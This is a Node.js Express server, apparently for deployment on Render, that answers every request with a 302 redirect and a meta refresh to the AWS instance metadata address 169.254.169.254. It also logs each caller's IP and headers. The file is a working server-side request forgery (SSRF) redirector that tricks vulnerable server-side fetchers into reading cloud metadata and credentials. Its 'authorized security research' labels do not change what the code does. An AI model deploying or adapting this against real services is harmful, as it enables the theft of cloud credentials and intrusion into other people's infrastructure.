const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk logging
app.use((req, res, next) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} from ${clientIP} - ${userAgent}`);
    
    // Log ke console (Render akan capture ini)
    console.log('SSRF_REQUEST:', {
        timestamp: new Date().toISOString(),
        method: req.method,
        path: req.url,
        clientIP: clientIP,
        userAgent: userAgent,
        headers: req.headers
    });
    
    next();
});

// Tangani semua route - redirect ke AWS metadata
app.all('*', (req, res) => {
    const targetURL = 'http://169.254.169.254/';
    
    res.set({
        'Location': targetURL,
        'X-SSRF-Demonstration': 'Security Research - AWS Metadata Redirect',
        'X-Original-Path': req.url,
        'X-Client-IP': req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        'X-Target-URL': targetURL,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    });
    
    res.status(302).send(`
        <html>
        <head>
            <title>SSRF Redirect Demonstration</title>
            <meta http-equiv="refresh" content="0; url=${targetURL}">
        </head>
        <body>
            <h1>SSRF Security Research Demonstration</h1>
            <p>Redirecting to AWS Metadata Service: <a href="${targetURL}">${targetURL}</a></p>
            <p><strong>Original Path:</strong> ${req.url}</p>
            <p><strong>Client IP:</strong> ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</p>
            <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
            <hr>
            <small>This is for authorized security research only.</small>
        </body>
        </html>
    `);
});

// Health check endpoint untuk Render
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        service: 'SSRF Redirect Demo',
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SSRF Redirect Server running on port ${PORT}`);
    console.log(`📍 All requests redirect to: http://169.254.169.254/`);
    console.log('✅ Health check available at: /health');
    console.log('⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY');
});
